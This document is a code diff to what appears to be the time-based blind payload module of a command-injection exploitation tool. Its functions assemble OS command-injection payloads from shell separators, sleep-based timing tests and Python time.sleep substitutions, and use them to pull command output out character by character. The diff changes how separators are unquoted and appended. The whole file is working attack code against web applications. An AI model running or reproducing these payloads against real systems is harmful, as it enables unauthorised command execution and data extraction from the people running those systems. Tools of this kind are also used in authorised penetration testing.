@@ -67,7 +67,9 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                  "sleep " + str(timesec)
                  )
-      separator = _urllib.parse.unquote(separator)
+      
+      # separator = _urllib.parse.unquote(separator)
+
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
@@ -77,6 +79,9 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  )
     else:
       pass
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
 
   return payload
 
@@ -126,7 +131,9 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
                  "[ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                  )
-      separator = _urllib.parse.unquote(separator)
+
+      # separator = _urllib.parse.unquote(separator)
+
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
@@ -136,6 +143,9 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
                  )
     else:
       pass
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
 
   payload = checks.payload_newline_fixation(payload)
 
@@ -194,7 +204,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
                  "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                  "sleep " + str(timesec)
                  )
-      separator = _urllib.parse.unquote(separator)
+      # separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
@@ -205,6 +215,9 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
                  )
     else:
       pass
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
 
   return payload
 
@@ -254,7 +267,9 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
                  "[ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\") "
                  )
-      separator = _urllib.parse.unquote(separator)
+
+      # separator = _urllib.parse.unquote(separator)
+
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
@@ -265,8 +280,10 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
     else:
       pass
 
-  payload = checks.payload_newline_fixation(payload)
-  return payload
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
+  return checks.payload_newline_fixation(payload)
 
 """
 Get the execution output, of shell execution.
@@ -325,7 +342,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                 "sleep " + str(timesec)
                 )
-      separator = _urllib.parse.unquote(separator)
+      # separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
@@ -337,6 +354,9 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 )
     else:
       pass
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
 
   return payload
 
@@ -388,7 +408,7 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                  )
       
-      separator = _urllib.parse.unquote(separator)
+      # separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
@@ -400,7 +420,11 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
     else:
       pass
 
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
   payload = checks.payload_newline_fixation(payload)
+
   return payload
 
 """
@@ -437,6 +461,7 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
                  "then sleep " + str(timesec) + separator +
                  "fi"
                  )
+
     elif separator == _urllib.parse.quote("&&") :
       #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
@@ -446,7 +471,7 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
                  "[ " + str(ascii_char) + " -eq $" + settings.RANDOM_VAR_GENERATOR + " ] " + separator +
                  "sleep " + str(timesec)
                  )
-      separator = _urllib.parse.unquote(separator)
+      # separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
@@ -456,6 +481,9 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
                  )
     else:
       pass
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
 
   return payload
 
@@ -493,6 +521,7 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
                  "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                  "fi"
                  )
+
     elif separator == _urllib.parse.quote("&&") :
       #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
@@ -502,7 +531,9 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
                  "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                  )
-      separator = _urllib.parse.unquote(separator)
+
+      # separator = _urllib.parse.unquote(separator)
+
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
@@ -512,7 +543,9 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
     else:
       pass
 
-  payload = checks.payload_newline_fixation(payload)
-  return payload
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
+  return checks.payload_newline_fixation(payload)
 
 # eof
